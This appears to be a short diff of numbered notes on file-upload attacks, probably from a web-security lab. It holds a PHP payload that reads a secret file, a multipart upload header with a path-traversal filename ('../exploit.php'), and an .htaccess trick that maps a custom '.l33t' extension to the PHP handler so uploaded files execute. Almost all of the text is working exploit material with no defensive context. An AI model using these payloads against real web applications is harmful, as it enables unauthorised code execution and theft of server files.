@@ -1,5 +1,10 @@
-<?php echo file_get_contents('/path/secret.txt'); ?>
+1. <?php echo file_get_contents('/path/secret.txt'); ?>
 
-content-type: application/x-php
+2. content-type: application/x-php
 
-Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
+3. Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
+
+4. filename=".htaccess" //change from exploit.php to .htaccess file
+Content-Type: text/plain //content type
+
+AddType application/x-httpd-php .l33t //use this as content of the .htaccess file to enable php file
